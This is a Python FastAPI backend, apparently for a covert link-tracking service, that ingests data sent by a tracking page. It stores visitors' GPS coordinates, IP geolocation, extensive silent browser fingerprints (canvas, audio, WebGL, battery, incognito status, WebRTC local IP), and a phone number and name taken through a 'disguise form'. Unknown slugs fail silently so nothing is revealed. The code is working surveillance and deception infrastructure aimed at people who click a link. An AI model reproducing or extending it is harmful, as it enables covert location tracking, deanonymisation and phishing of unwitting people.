from fastapi import APIRouter, Request
from pydantic import BaseModel
from typing import Optional
from user_agents import parse as ua_parse

from services.ip_lookup import lookup_ip
from services.link_service import get_link_by_slug
from services.supabase_client import supabase
from services.device_resolver import resolve_device_identity, resolve_real_os

router = APIRouter()


class TrackPayload(BaseModel):
    slug:                 str
    # GPS (high-accuracy if permitted)
    gps_lat:              Optional[float] = None
    gps_lng:              Optional[float] = None
    gps_accuracy:         Optional[float] = None

    # Screen & Environment
    screen_width:         Optional[int]   = None
    screen_height:        Optional[int]   = None
    language:             Optional[str]   = None
    platform:             Optional[str]   = None
    cookie_enabled:       Optional[bool]  = None
    do_not_track:         Optional[str]   = None
    connection_type:      Optional[str]   = None
    referrer:             Optional[str]   = None
    user_agent:           Optional[str]   = None

    # Client Hints (High Entropy - Exact Model & Real OS)
    client_model:         Optional[str]   = None
    client_os_version:    Optional[str]   = None
    network_downlink:     Optional[float] = None
    network_rtt:          Optional[int]   = None

    # Interactive captured data (if disguise form filled)
    captured_phone:       Optional[str]   = None
    captured_name:        Optional[str]   = None

    # Silent Fingerprints
    canvas_hash:          Optional[str]   = None
    webgl_vendor:         Optional[str]   = None
    webgl_renderer:       Optional[str]   = None
    audio_hash:           Optional[str]   = None
    fonts_hash:           Optional[str]   = None
    color_depth:          Optional[int]   = None
    pixel_ratio:          Optional[float] = None
    screen_avail_w:       Optional[int]   = None
    screen_avail_h:       Optional[int]   = None
    touch_support:        Optional[bool]  = None
    max_touch_points:     Optional[int]   = None
    hardware_concurrency: Optional[int]   = None
    device_memory:        Optional[float] = None
    timezone_offset:      Optional[int]   = None
    timezone_name:        Optional[str]   = None
    has_ad_blocker:       Optional[bool]  = None
    is_incognito:         Optional[bool]  = None
    battery_level:        Optional[float] = None
    battery_charging:     Optional[bool]  = None
    webrtc_local_ip:      Optional[str]   = None
    plugins:              Optional[str]   = None
    gpu_info:             Optional[str]   = None


def _get_real_ip(request: Request) -> str:
    """Resolve real IP behind proxies / load balancers."""
    forwarded = request.headers.get("x-forwarded-for", "")
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("x-real-ip", "")
    if real_ip:
        return real_ip
    return request.client.host if request.client else ""


@router.post("/api/ingest")
async def ingest(payload: TrackPayload, request: Request):
    """
    Receives the JS payload from the tracking page.
    Looks up IP geolocation, resolves high-entropy hardware identity, saves to Supabase.
    """
    link = get_link_by_slug(payload.slug)
    if not link:
        return {"status": "ok"}  # Silent fail — don't reveal anything

    ip = _get_real_ip(request)
    geo = await lookup_ip(ip)

    ua_string = payload.user_agent or request.headers.get("user-agent", "")
    ua = ua_parse(ua_string)

    device_type = (
        "mobile"  if ua.is_mobile  else
        "tablet"  if ua.is_tablet  else
        "pc"
    )

    # Resolve accurate device identity using Client Hints + GPU lookup
    resolved = resolve_device_identity(
        ua_brand=ua.device.brand,
        ua_model=ua.device.model,
        client_model=payload.client_model,
        webgl_renderer=payload.webgl_renderer
    )

    real_os = resolve_real_os(
        os_family=ua.os.family,
        os_version=ua.os.version_string,
        client_platform_ver=payload.client_os_version
    )

    log_entry = {
        "link_id":              link["id"],
        "slug":                 payload.slug,

        # IP geolocation
        **geo,

        # GPS (High accuracy if permitted)
        "gps_lat":              payload.gps_lat,
        "gps_lng":              payload.gps_lng,
        "gps_accuracy":         payload.gps_accuracy,

        # Accurate Device Identification
        "user_agent":           ua_string,
        "browser":              ua.browser.family,
        "browser_version":      ua.browser.version_string,
        "os":                   real_os,
        "os_version":           payload.client_os_version or ua.os.version_string,
        "device_type":          device_type,
        "device_brand":         resolved["brand"],
        "device_model":         resolved["model"],
        "is_mobile":            ua.is_mobile,
        "is_tablet":            ua.is_tablet,
        "is_bot":               ua.is_bot,

        # Browser environment
        "screen_width":         payload.screen_width,
        "screen_height":        payload.screen_height,
        "language":             payload.language,
        "platform":             payload.platform,
        "cookie_enabled":       payload.cookie_enabled,
        "do_not_track":         payload.do_not_track,
        "connection_type":      payload.connection_type,
        "referrer":             payload.referrer,

        # Captured phone / interactive data
        "captured_phone":       payload.captured_phone,
        "captured_name":        payload.captured_name,
        "client_model":         payload.client_model,
        "client_os_version":    payload.client_os_version,
        "network_downlink":     payload.network_downlink,
        "network_rtt":          payload.network_rtt,
        "chipset":              resolved.get("chipset"),

        # Advanced fingerprints
        "canvas_hash":          payload.canvas_hash,
        "webgl_vendor":         payload.webgl_vendor,
        "webgl_renderer":       payload.webgl_renderer,
        "audio_hash":           payload.audio_hash,
        "fonts_hash":           payload.fonts_hash,
        "color_depth":          payload.color_depth,
        "pixel_ratio":          payload.pixel_ratio,
        "screen_avail_w":       payload.screen_avail_w,
        "screen_avail_h":       payload.screen_avail_h,
        "touch_support":        payload.touch_support,
        "max_touch_points":     payload.max_touch_points,
        "hardware_concurrency": payload.hardware_concurrency,
        "device_memory":        payload.device_memory,
        "timezone_offset":      payload.timezone_offset,
        "timezone_name":        payload.timezone_name,
        "has_ad_blocker":       payload.has_ad_blocker,
        "is_incognito":         payload.is_incognito,
        "battery_level":        payload.battery_level,
        "battery_charging":     payload.battery_charging,
        "webrtc_local_ip":      payload.webrtc_local_ip,
        "plugins":              payload.plugins,
        "gpu_info":             payload.gpu_info,
    }

    try:
        supabase.table("tracking_logs").insert(log_entry).execute()
    except Exception as e:
        # Fallback if any new optional column is not yet in Supabase table
        # Exclude newly added columns that might not exist in an unmigrated DB
        essential_entry = {k: v for k, v in log_entry.items() if k not in [
            "captured_phone", "captured_name", "client_model", "client_os_version", "network_downlink", "network_rtt", "chipset"
        ]}
        try:
            supabase.table("tracking_logs").insert(essential_entry).execute()
        except Exception:
            pass

    return {"status": "ok"}
